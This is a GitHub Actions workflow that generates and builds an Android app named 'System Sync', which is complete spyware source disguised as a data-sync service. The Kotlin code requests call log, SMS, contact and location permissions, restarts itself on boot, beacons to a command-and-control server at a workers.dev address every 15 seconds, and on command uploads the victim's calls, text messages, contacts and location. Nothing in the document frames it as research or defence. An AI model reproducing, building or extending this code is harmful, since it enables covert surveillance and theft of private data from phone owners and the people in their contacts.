name: build-apk

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up JDK 17
        uses: actions/setup-java@v5
        with:
          distribution: temurin
          java-version: 17

      - name: Generate Project Structure
        run: |
          # Create folders
          mkdir -p app/src/main/java/com/system/sync
          mkdir -p app/src/main/res/values
          
          # settings.gradle.kts
          cat > settings.gradle.kts << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "SystemSync"
          include(":app")
          EOF

          # build.gradle.kts (root)
          cat > build.gradle.kts << 'EOF'
          plugins {
              id("com.android.application") version "8.2.0" apply false
              id("org.jetbrains.kotlin.android") version "1.9.20" apply false
          }
          EOF

          # gradle.properties
          cat > gradle.properties << 'EOF'
          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          kotlin.code.style=official
          android.nonTransitiveRClass=true
          EOF

          # app/build.gradle.kts
          cat > app/build.gradle.kts << 'EOF'
          plugins {
              id("com.android.application")
              id("org.jetbrains.kotlin.android")
          }
          android {
              namespace = "com.system.sync"
              compileSdk = 34
              defaultConfig {
                  applicationId = "com.system.sync"
                  minSdk = 26
                  targetSdk = 34
                  versionCode = 1
                  versionName = "1.0"
              }
              buildTypes {
                  release { isMinifyEnabled = false }
              }
              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = "17" }
          }
          dependencies {
              implementation("androidx.core:core-ktx:1.12.0")
              implementation("androidx.appcompat:appcompat:1.6.1")
              implementation("com.squareup.okhttp3:okhttp:4.12.0")
          }
          EOF

          # AndroidManifest.xml
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
              <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
              <uses-permission android:name="android.permission.READ_SMS"/>
              <uses-permission android:name="android.permission.READ_CONTACTS"/>
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
              <uses-permission android:name="android.permission.CAMERA"/>
              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
              <uses-permission android:name="android.permission.WAKE_LOCK"/>
              <application android:label="System Sync" android:allowBackup="false" android:theme="@android:style/Theme.Material.Light.NoActionBar">
                  <service android:name=".CoreService" android:exported="false" android:foregroundServiceType="camera|microphone"/>
                  <receiver android:name=".BootReceiver" android:exported="true">
                      <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
                  </receiver>
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF

          # strings.xml
          cat > app/src/main/res/values/strings.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources><string name="app_name">System Sync</string></resources>
          EOF
          
      - name: Create Kotlin Files
        run: |
          # MainActivity.kt
          cat > app/src/main/java/com/system/sync/MainActivity.kt << 'EOF'
          package com.system.sync
          import android.Manifest
          import android.content.Intent
          import android.content.pm.PackageManager
          import android.os.Build
          import android.os.Bundle
          import androidx.appcompat.app.AppCompatActivity
          import androidx.core.app.ActivityCompat
          import androidx.core.content.ContextCompat
          class MainActivity : AppCompatActivity() {
              private val REQ = 1001
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  val perms = mutableListOf(
                      Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE,
                      Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS,
                      Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
                      Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
                  )
                  if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)
                  val missing = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
                  if (missing.isNotEmpty()) ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ)
                  else startServiceNow()
              }
              override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults)
                  startServiceNow()
              }
              private fun startServiceNow() {
                  val i = Intent(this, CoreService::class.java)
                  if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
                  finish()
              }
          }
          EOF

          # BootReceiver.kt
          cat > app/src/main/java/com/system/sync/BootReceiver.kt << 'EOF'
          package com.system.sync
          import android.content.BroadcastReceiver
          import android.content.Context
          import android.content.Intent
          import android.os.Build
          class BootReceiver : BroadcastReceiver() {
              override fun onReceive(context: Context, intent: Intent?) {
                  if (intent?.action == Intent.ACTION_BOOT_COMPLETED) {
                      val i = Intent(context, CoreService::class.java)
                      if (Build.VERSION.SDK_INT >= 26) context.startForegroundService(i) else context.startService(i)
                  }
              }
          }
          EOF

          # CoreService.kt
          cat > app/src/main/java/com/system/sync/CoreService.kt << 'EOF'
          package com.system.sync
          import android.app.*
          import android.content.Intent
          import android.os.Build
          import android.os.IBinder
          import android.util.Base64
          import androidx.core.app.NotificationCompat
          import okhttp3.*
          import org.json.JSONArray
          import org.json.JSONObject
          import java.util.concurrent.TimeUnit
          class CoreService : Service() {
              private val BASE = "https://c2.vonkarsen903.workers.dev"
              private val client = OkHttpClient.Builder().connectTimeout(20, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
              private var deviceId: String = ""
              private var running = true
              override fun onCreate() {
                  super.onCreate()
                  startForeground(1, buildNotification())
                  deviceId = register()
                  Thread { beaconLoop() }.start()
              }
              private fun buildNotification(): Notification {
                  if (Build.VERSION.SDK_INT >= 26) {
                      val ch = NotificationChannel("sync", "Sync", NotificationManager.IMPORTANCE_LOW)
                      (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
                  }
                  val chId = if (Build.VERSION.SDK_INT >= 26) "sync" else ""
                  return NotificationCompat.Builder(this, chId).setContentTitle("System Sync").setContentText("Keeping data in sync").setSmallIcon(android.R.drawable.stat_notify_sync).setPriority(NotificationCompat.PRIORITY_LOW).build()
              }
              private fun register(): String {
                  val info = JSONObject().put("model", Build.MODEL).put("brand", Build.BRAND).put("sdk", Build.VERSION.SDK_INT).put("manufacturer", Build.MANUFACTURER)
                  val req = Request.Builder().url("$BASE/register").post(JSONObject().put("info", info).toString().toRequestBody("application/json".toMediaType())).build()
                  return try { client.newCall(req).execute().use { r -> if (!r.isSuccessful) return ""; JSONObject(r.body!!.string()).getString("device_id") } } catch (e: Exception) { "" }
              }
              private fun beaconLoop() {
                  while (running) {
                      try {
                          if (deviceId.isEmpty()) { deviceId = register(); Thread.sleep(5000); continue }
                          val req = Request.Builder().url("$BASE/beacon").post(JSONObject().put("device_id", deviceId).toString().toRequestBody("application/json".toMediaType())).build()
                          client.newCall(req).execute().use { r ->
                              if (r.code == 404) deviceId = register()
                              else if (r.isSuccessful) {
                                  val cmds = JSONObject(r.body!!.string()).getJSONArray("commands")
                                  for (i in 0 until cmds.length()) handleCommand(cmds.getJSONObject(i))
                              }
                          }
                      } catch (e: Exception) {}
                      Thread.sleep(15000)
                  }
              }
              private fun handleCommand(cmd: JSONObject) {
                  when (cmd.getString("cmd")) {
                      "dump_calls" -> dumpCalls()
                      "dump_sms" -> dumpSms()
                      "dump_contacts" -> dumpContacts()
                      "dump_loc" -> dumpLocation()
                  }
              }
              private fun upload(kind: String, data: ByteArray) {
                  try {
                      val req = Request.Builder().url("$BASE/upload").post(JSONObject().put("device_id", deviceId).put("kind", kind).put("data", Base64.encodeToString(data, Base64.NO_WRAP)).toString().toRequestBody("application/json".toMediaType())).build()
                      client.newCall(req).execute().close()
                  } catch (e: Exception) {}
              }
              private fun dumpCalls() {
                  try {
                      val arr = JSONArray()
                      contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC")?.use {
                          val num = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER); val typ = it.getColumnIndex(android.provider.CallLog.Calls.TYPE); val dur = it.getColumnIndex(android.provider.CallLog.Calls.DURATION); val dt = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                          while (it.moveToNext()) arr.put(JSONObject().put("number", it.getString(num) ?: "").put("type", it.getInt(typ)).put("duration", it.getLong(dur)).put("date", it.getLong(dt)))
                      }
                      upload("call", arr.toString().toByteArray())
                  } catch (e: Exception) {}
              }
              private fun dumpSms() {
                  try {
                      val arr = JSONArray()
                      contentResolver.query(android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC")?.use {
                          val addr = it.getColumnIndex("address"); val body = it.getColumnIndex("body"); val dt = it.getColumnIndex("date")
                          while (it.moveToNext()) arr.put(JSONObject().put("address", it.getString(addr) ?: "").put("body", it.getString(body) ?: "").put("date", it.getLong(dt)))
                      }
                      upload("sms", arr.toString().toByteArray())
                  } catch (e: Exception) {}
              }
              private fun dumpContacts() {
                  try {
                      val arr = JSONArray()
                      contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use {
                          val name = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME); val num = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                          while (it.moveToNext()) arr.put(JSONObject().put("name", it.getString(name) ?: "").put("number", it.getString(num) ?: ""))
                      }
                      upload("contacts", arr.toString().toByteArray())
                  } catch (e: Exception) {}
              }
              private fun dumpLocation() {
                  try {
                      val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                      val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                      if (loc != null) upload("location", JSONObject().put("lat", loc.latitude).put("lon", loc.longitude).put("acc", loc.accuracy).put("time", loc.time).toString().toByteArray())
                  } catch (e: Exception) {}
              }
              override fun onBind(intent: Intent?): IBinder? = null
              override fun onDestroy() { running = false; super.onDestroy() }
          }
          EOF

      - name: Build with Gradle
        run: |
          gradle wrapper --gradle-version 8.5
          echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
          chmod +x ./gradlew
          ./gradlew assembleDebug --no-daemon --stacktrace

      - name: Upload APK
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: SystemSync-debug
          path: app/build/outputs/apk/debug/app-debug.apk
          retention-days: 7
